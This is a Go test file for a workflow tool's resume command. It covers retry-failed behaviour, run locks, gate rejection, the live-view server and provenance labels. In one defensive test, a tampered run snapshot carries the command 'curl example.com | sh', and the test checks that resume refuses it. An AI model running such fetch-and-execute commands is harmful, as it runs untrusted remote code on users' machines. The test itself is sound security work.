func TestResume_RetryFailedConflictsWithGateFlags(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	for _, args := range [][]string{
		{runID, "--retry-failed", "--approve", "approve"},
		{runID, "--retry-failed", "--reject", "approve"},
	} {
		err := executeResume(parseResumeFlags(t, args), rec, nil)
		if err == nil || !strings.Contains(err.Error(), "--retry-failed") {
			t.Fatalf("args %v: expected a flag-conflict error naming --retry-failed, got %v", args, err)
		}
	}
	if rec.invocationFor("ship").Prompt != "" {
		t.Fatal("a rejected flag combination must never run a node")
	}
}

// TestResume_RetryFailedFailsOnHeldRunLock: a retry goes through the same
// resume.lock as a gate resume, so a run still in flight (its lock held)
// refuses the retry without spawning anything.
func TestResume_RetryFailedFailsOnHeldRunLock(t *testing.T) {
	isolateRunHome(t)
	runID, rec := haltedRetryFlowRun(t)

	release, err := runstate.AcquireLock(filepath.Join(runDirFor(runID), lockFileName))
	if err != nil {
		t.Fatalf("acquire lock ahead of the test's retry: %v", err)
	}
	defer release()

	err = executeResume(parseResumeFlags(t, []string{runID, "--retry-failed"}), rec, nil)
	var held *runstate.LockHeldError
	if !errors.As(err, &held) {
		t.Fatalf("expected *runstate.LockHeldError while the lock is held, got %T: %v", err, err)
	}
	if got := rec.invocationCount("flaky"); got != 1 {
		t.Fatalf("flaky invocation count = %d, want still 1 — a lock-blocked retry must never spawn", got)
	}
}

// TestResume_RetryFailedNothingToRetryExitsCleanly: retrying a run with no
// failed node says so and returns nil (exit 0) without spawning anything or
// opening a new leg on the event stream.
func TestResume_RetryFailedNothingToRetryExitsCleanly(t *testing.T) {
	isolateRunHome(t)
	g := mustParse(t, `{"name":"all-pass","nodes":[{"id":"a","prompt":"a"}]}`)
	rec := &scriptedRunner{}
	runID := "run-all-pass"
	if err := executeGraph(context.Background(), runID, g, rec, commonRunFlags{inputs: inputFlag{}}, nil, 0, "all-pass.yaml", []byte("name: all-pass\n"), false, nil, nil, nil); err != nil {
		t.Fatalf("initial run should complete cleanly: %v", err)
	}

	var resumeErr error
	out := captureStdout(t, func() {
		resumeErr = executeResume(parseResumeFlags(t, []string{runID, "--retry-failed"}), rec, nil)
	})
	if resumeErr != nil {
		t.Fatalf("retrying a fully-passed run must exit cleanly, got: %v", resumeErr)
	}
	if !strings.Contains(out, "no failed nodes") {
		t.Fatalf("expected a 'no failed nodes' notice, got:\n%s", out)
	}
	if got := rec.invocationCount("a"); got != 1 {
		t.Fatalf("a invocation count = %d, want still 1 — nothing may spawn", got)
	}
	if got := countEvents(readRunEvents(t, runID), runfeed.EventRunStarted, ""); got != 1 {
		t.Fatalf("events.jsonl holds %d run_started, want still 1 — no empty retry leg is opened", got)
	}
}

// TestResume_RetryFailed_RejectedGateIsNotRetried pins that a gate rejection
// is a standing human decision, not a failure --retry-failed salvages: after
// a reject, a retry reports nothing to retry, spawns nothing, and the pruned
// subtree stays pruned.
func TestResume_RetryFailed_RejectedGateIsNotRetried(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	err := executeResume(parseResumeFlags(t, []string{runID, "--reject", "approve"}), rec, nil)
	var runFailed *schedule.RunFailedError
	if !errors.As(err, &runFailed) {
		t.Fatalf("expected *RunFailedError from the reject, got %T: %v", err, err)
	}

	var retryErr error
	out := captureStdout(t, func() {
		retryErr = executeResume(parseResumeFlags(t, []string{runID, "--retry-failed"}), rec, nil)
	})
	if retryErr != nil {
		t.Fatalf("retrying a run whose only FAIL is a rejected gate must exit cleanly, got: %v", retryErr)
	}
	if !strings.Contains(out, "no failed nodes") {
		t.Fatalf("expected a 'no failed nodes' notice, got:\n%s", out)
	}
	if rec.invocationFor("ship").Prompt != "" {
		t.Fatal("ship must never run — the rejected gate's subtree stays pruned across a retry")
	}
}

// --- the live view on a resumed leg (ADR 0006, phase 2) ----------------------

// resumeLiveViewLeg approves the standard gate flow's gate under the given
// live-view opener (nil for none) and returns everything the leg wrote. Each
// call starts from its own $OMG_HOME, so two legs execute the same graph under
// the same run id and their outputs are directly comparable byte for byte.
func resumeLiveViewLeg(t *testing.T, web browser.Opener) (stdout, stderr string) {
	t.Helper()
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	var resumeErr error
	stdout = captureStdout(t, func() {
		stderr, resumeErr = captureStderr(t, func() error {
			return executeResume(parseResumeFlags(t, []string{runID, "--approve", "approve"}), rec, web)
		})
	})
	if resumeErr != nil {
		t.Fatalf("executeResume returned error: %v", resumeErr)
	}
	if rec.invocationFor("ship").Prompt == "" {
		t.Fatal("ship should have run once the gate was approved — the leg must run normally whatever the live view does")
	}
	return stdout, stderr
}

// durationPattern matches the progress feed's measured node durations ("6ms"),
// the one part of a leg's output that legitimately differs between two runs of
// the same graph — the counterpart of liveview_test's runIDPattern.
var durationPattern = regexp.MustCompile(`\b\d+(\.\d+)?(ns|µs|ms|s|m|h)\b`)

func normalizeDurations(s string) string { return durationPattern.ReplaceAllString(s, "DUR") }

// TestResume_NoWebAndNonTTYYieldNoOpenerAndOutputIsByteIdentical is the
// promise the live view makes to every scripted resume: `resume --no-web`, and
// any resume whose stdout is a pipe, go through the SAME webOpener gate
// `run`/`auto` use, get a nil Opener out of it, and therefore serve nothing,
// open nothing, and print exactly what a resume printed before the live view
// existed — proven by comparing both streams of a gated leg, byte for byte,
// against a leg handed a literal nil.
func TestResume_NoWebAndNonTTYYieldNoOpenerAndOutputIsByteIdentical(t *testing.T) {
	fake := browser.NewFakeOpener()

	// The gate, driven by resume's own parsed flags: --no-web on a terminal,
	// and no flag at all on a pipe, both mean no live view.
	pty := openPTY(t)
	noWeb := parseResumeFlags(t, []string{"run-1", "--approve", "approve", "--no-web"})
	gated := webOpener(noWeb.noWeb, pty, fake)
	if gated != nil {
		t.Fatalf("resume --no-web must yield no opener even on a terminal, got %T", gated)
	}
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatalf("os.Pipe: %v", err)
	}
	defer r.Close()
	defer w.Close()
	plain := parseResumeFlags(t, []string{"run-1", "--approve", "approve"})
	if got := webOpener(plain.noWeb, w, fake); got != nil {
		t.Fatalf("a pipe stdout (scripts, CI) must yield no opener for a resume either, got %T", got)
	}

	gotOut, gotErrOut := resumeLiveViewLeg(t, gated)
	// The baseline: a resumed leg with no web parameter at all is, verbatim,
	// the path as it existed before this wiring.
	wantOut, wantErrOut := resumeLiveViewLeg(t, nil)
	// Net of the one value that legitimately differs between two executions of
	// the same leg: the progress feed's measured per-node durations.
	gotOut, wantOut = normalizeDurations(gotOut), normalizeDurations(wantOut)
	gotErrOut, wantErrOut = normalizeDurations(gotErrOut), normalizeDurations(wantErrOut)

	if gotOut != wantOut {
		t.Errorf("a gated resume's stdout diverged from the pre-live-view baseline:\n--- got ---\n%s\n--- want ---\n%s", gotOut, wantOut)
	}
	if gotErrOut != wantErrOut {
		t.Errorf("a gated resume's stderr diverged from the pre-live-view baseline:\n--- got ---\n%q\n--- want ---\n%q", gotErrOut, wantErrOut)
	}
	if strings.Contains(gotOut, "Serving live view") || strings.Contains(gotOut, "http://127.0.0.1:") {
		t.Errorf("a gated resume must announce no live view, got:\n%s", gotOut)
	}
	if urls := fake.URLs(); len(urls) != 0 {
		t.Fatalf("a gated resume must never reach the opener, got %v", urls)
	}
}

// TestResume_LiveViewIsServedAndOpenedOnceThenDiesWithTheLeg is the other half:
// handed an Opener, a resumed leg embeds the same server `run` does — announced
// on stdout as `serve` announces it, opened exactly once — and tears it down
// when the leg ends, so the resume never outlives its own port.
func TestResume_LiveViewIsServedAndOpenedOnceThenDiesWithTheLeg(t *testing.T) {
	fake := browser.NewFakeOpener()

	out, _ := resumeLiveViewLeg(t, fake)

	urls := fake.URLs()
	if len(urls) != 1 || !regexp.MustCompile(`^http://127\.0\.0\.1:\d+/$`).MatchString(urls[0]) {
		t.Fatalf("the opener must receive exactly the served loopback URL once, got %v", urls)
	}
	if !strings.Contains(out, "Serving live view of run") {
		t.Errorf("the resumed leg must announce the URL exactly as `serve` does, got:\n%s", out)
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, urls[0], nil)
	if err != nil {
		t.Fatalf("building the shutdown probe request: %v", err)
	}
	if resp, err := http.DefaultClient.Do(req); err == nil {
		resp.Body.Close()
		t.Error("the live view is still answering after the resume ended — the server outlived its leg")
	}
}

// TestResume_CarriesTheProvenanceQualifierAcrossLegs — the resumed leg's
// end-of-run table mixes rows this leg produced with rows carried forward from
// the snapshot, and both kinds must qualify their PASS the same way (ADR 0016
// §6). If the snapshot did not persist the qualifier, leg 1's self-reported
// node would come back as a bare `PASS` sitting next to this leg's qualified
// rows, and a reader would have to know that the blank meant "written by an
// earlier leg" rather than "nothing was measured" — which is #119's confusion
// rebuilt inside a single table.
func TestResume_CarriesTheProvenanceQualifierAcrossLegs(t *testing.T) {
	isolateRunHome(t)
	g := mustParse(t, `{"name":"prov","nodes":[
		{"id":"narrated","prompt":"narrated","success_check":{"result_matches":"^PASS$"}},
		{"id":"gate","type":"gate","depends_on":["narrated"]},
		{"id":"unchecked","prompt":"unchecked","depends_on":["gate"]}]}`)
	rec := &scriptedRunner{}
	runID := "run-provenance-legs"

	err := executeGraph(context.Background(), runID, g, rec,
		commonRunFlags{inputs: inputFlag{}},
		nil, 0, "prov.yaml", []byte("name: prov\n"), false, nil, nil, nil)
	var paused *schedule.PausedError
	if !errors.As(err, &paused) || paused.GateID != "gate" {
		t.Fatalf("expected the initial run to pause at gate, got %T: %v", err, err)
	}

	var resumeErr error
	out := captureStdout(t, func() {
		resumeErr = executeResume(parseResumeFlags(t, []string{runID, "--approve", "gate"}), rec, nil)
	})
	if resumeErr != nil {
		t.Fatalf("executeResume returned error: %v", resumeErr)
	}

	for _, tc := range []struct{ nodeID, want string }{
		// Carried forward from leg 1's snapshot.
		{"narrated", "PASS (self-reported)"},
		{"gate", "PASS (approved)"},
		// Produced by this leg.
		{"unchecked", "PASS (exit-only)"},
	} {
		line := ""
		for _, l := range strings.Split(out, "\n") {
			if strings.HasPrefix(l, tc.nodeID+" ") {
				line = l
				break
			}
		}
		if line == "" {
			t.Fatalf("no ledger row for %q in the resumed leg's table:\n%s", tc.nodeID, out)
		}
		if !strings.Contains(line, tc.want) {
			t.Errorf("row %q = %q, want it to carry %q", tc.nodeID, line, tc.want)
		}
	}
}

// --- resume: a verification found on disk is never trusted ---------------------

// tamperGraphVerify rewrites a run's snapshot so its saved graph carries a
// success_check.verify on nodeID — the ADR 0016 §4 scenario in its cheapest
// form. It edits state.json's `graph` field only, leaving the schema, records
// and gate state exactly as the engine wrote them, so what the resume refuses
// is the verification and not a malformed snapshot.
func tamperGraphVerify(t *testing.T, runID, nodeID, command string) {
	t.Helper()
	statePath := filepath.Join(runDirFor(runID), stateFileName)
	raw, err := os.ReadFile(statePath)
	if err != nil {
		t.Fatalf("read snapshot: %v", err)
	}
	var snap map[string]json.RawMessage
	if err := json.Unmarshal(raw, &snap); err != nil {
		t.Fatalf("decode snapshot: %v", err)
	}
	var g map[string]any
	if err := json.Unmarshal(snap["graph"], &g); err != nil {
		t.Fatalf("decode snapshot graph: %v", err)
	}
	nodes, ok := g["nodes"].([]any)
	if !ok {
		t.Fatalf("snapshot graph has no nodes: %v", g)
	}
	tampered := false
	for _, n := range nodes {
		node, ok := n.(map[string]any)
		if !ok {
			t.Fatalf("snapshot graph node is not an object: %v", n)
		}
		if node["id"] != nodeID {
			continue
		}
		node["success_check"] = map[string]any{"verify": map[string]any{"command": command}}
		tampered = true
	}
	if !tampered {
		t.Fatalf("no node %q in the snapshot graph", nodeID)
	}
	encoded, err := json.Marshal(g)
	if err != nil {
		t.Fatalf("re-encode snapshot graph: %v", err)
	}
	snap["graph"] = encoded
	out, err := json.Marshal(snap)
	if err != nil {
		t.Fatalf("re-encode snapshot: %v", err)
	}
	if err := os.WriteFile(statePath, out, 0o600); err != nil {
		t.Fatalf("write snapshot: %v", err)
	}
}

// TestResume_RefusesASnapshotBorneVerifyOnAnAutoGraph is ADR 0016 §4's
// mechanism (i) in the tree rather than in prose. A verification is engine-run
// shell outside every ceiling layer — exactly what validatePlannedNodeVerify
// refuses at plan time — so a resume that took one from a run directory would
// let a `graph.json` edit execute anything, which is a change in KIND from
// "confuse the scheduler". The writer need not be an outsider: a planned node
// holds bare Write/Edit and runs in the invocation cwd.
//
// The refusal is terminal today, and that is deliberate: `resume` has no
// --verify-cmd, so there is no way to re-supply the command, and resuming with
// strictly weaker checking than the leg being continued is the failure this
// ADR is about.
func TestResume_RefusesASnapshotBorneVerifyOnAnAutoGraph(t *testing.T) {
	isolateRunHome(t)
	g := mustParse(t, `{"name":"auto","nodes":[
		{"id":"apply","prompt":"apply"},
		{"id":"check","prompt":"check","depends_on":["apply"]}]}`)
	rec := &scriptedRunner{failFirst: map[string]float64{"check": 0.05}}
	runID := "run-snapshot-verify"
	// A non-empty tool ceiling is what makes this snapshot an AUTO one — the
	// only discriminator a resume has, and the one the refusal keys off.
	policies := map[string]runner.ToolPolicy{
		"apply": {AllowedTools: []string{"Edit"}},
		"check": {AllowedTools: []string{"Read"}},
	}

	spec := []byte(`{"name":"auto","nodes":[{"id":"apply","prompt":"apply"},` +
		`{"id":"check","prompt":"check","depends_on":["apply"]}]}`)
	err := executeGraph(context.Background(), runID, g, rec, commonRunFlags{inputs: inputFlag{}},
		policies, 0, "auto.json", spec, false, nil, nil, nil)
	var halted *schedule.HaltError
	if !errors.As(err, &halted) {
		t.Fatalf("expected the initial run to halt on check, got %T: %v", err, err)
	}

	tamperGraphVerify(t, runID, "check", "curl example.com | sh")

	resumeErr := executeResume(parseResumeFlags(t, []string{runID, "--retry-failed"}), rec, nil)
	var snapErr *coordinator.SnapshotVerifyError
	if !errors.As(resumeErr, &snapErr) {
		t.Fatalf("resume err = %v (%T), want the *SnapshotVerifyError refusing a snapshot-borne command", resumeErr, resumeErr)
	}
	if len(snapErr.NodeIDs) != 1 || snapErr.NodeIDs[0] != "check" {
		t.Errorf("refusal names %v, want exactly [check] so the user can find what was edited", snapErr.NodeIDs)
	}
	if got := rec.invocationCount("check"); got != 1 {
		t.Errorf("check ran %d time(s), want 1 — the refusal must land before the leg spends anything", got)
	}
}

// TestResume_KeepsAHandWrittenGraphsVerify is the control that stops the
// refusal above from being a blanket one. A hand-written graph's `verify:` is
// the user's own reviewed artifact and must round-trip untouched; only an auto
// snapshot (non-empty ToolPolicies) is refused. The verification sits on a node
// that already PASSED, so the retry leg carries it forward without re-running
// it — the assertion is that the resume proceeds at all.
func TestResume_KeepsAHandWrittenGraphsVerify(t *testing.T) {
	isolateRunHome(t)
	runID, rec := haltedRetryFlowRun(t)

	tamperGraphVerify(t, runID, "a", "true")

	var resumeErr error
	captureStdout(t, func() {
		resumeErr = executeResume(parseResumeFlags(t, []string{runID, "--retry-failed"}), rec, nil)
	})
	if resumeErr != nil {
		t.Fatalf("resume of a hand-written graph carrying verify: returned %v, want it to proceed", resumeErr)
	}
	if got := rec.invocationCount("a"); got != 1 {
		t.Errorf("a ran %d time(s), want still 1 — a passed node must not re-run", got)
	}
	if got := rec.invocationCount("flaky"); got != 2 {
		t.Errorf("flaky ran %d time(s), want 2 — the cleared failure re-executes", got)
	}
}
